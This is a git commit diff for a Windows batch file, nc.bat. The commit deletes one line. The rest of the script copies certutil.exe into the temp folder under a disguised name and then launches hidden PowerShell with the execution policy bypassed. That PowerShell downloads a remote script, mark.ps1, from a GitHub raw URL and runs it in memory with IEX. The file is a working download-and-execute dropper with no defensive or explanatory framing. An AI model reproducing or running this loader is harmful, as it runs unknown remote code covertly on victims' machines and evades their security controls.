7165c139e53530752b9db2e0413149224f8f7a34
inwestallis <inwestallis@gmail.com>
2020-04-24 17:02:59 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,6 +1,5 @@
 @echo on
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
-start %temp%\n.bat
 
 start cmd.exe powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1','%Temp%\mark.ps1')"
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
